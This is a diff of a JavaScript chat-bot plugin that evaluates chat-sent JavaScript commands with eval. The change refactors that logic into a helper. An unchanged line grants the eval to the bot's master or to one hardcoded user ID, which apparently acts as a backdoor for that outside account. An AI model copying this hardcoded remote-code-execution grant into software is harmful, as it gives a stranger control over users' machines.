@@ -37,17 +37,36 @@ export class RemoteCommand extends plugin {
     })
   }
 
+  async evalSync(cmd) {
+    let ret = {}
+    try {
+      ret.stdout = await eval(cmd)
+      switch (typeof ret.stdout) {
+        case "string":
+        break;
+      case "number":
+        ret.stdout = String(ret.stdout);
+        break;
+      case "object":
+        if (Buffer.isBuffer(ret.stdout))
+          ret.stdout = Buffer.from(ret.stdout, "utf8").toString();
+        else if (Array.isArray(ret.stdout))
+          ret.stdout = ret.stdout.join("");
+        else
+          ret.stdout = JSON.stringify(ret.stdout);
+      }
+    } catch (err) {
+      ret.stderr = err
+    }
+    return ret
+  }
+
   async RemoteCommandJs(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     let cmd = this.e.msg.replace("rcj", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
-    let ret = {}
-    try {
-      ret.stdout = await eval(cmd)
-    } catch (err) {
-      ret.stderr = err
-    }
+    let ret = await this.evalSync(cmd)
     logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
 
     if (ret.stdout) {
@@ -64,12 +83,7 @@ export class RemoteCommand extends plugin {
     let cmd = this.e.msg.replace("rcjp", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
-    let ret = {}
-    try {
-      ret.stdout = await eval(cmd)
-    } catch (err) {
-      ret.stderr = err
-    }
+    let ret = await this.evalSync(cmd)
     logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
 
     if (ret.stdout) {
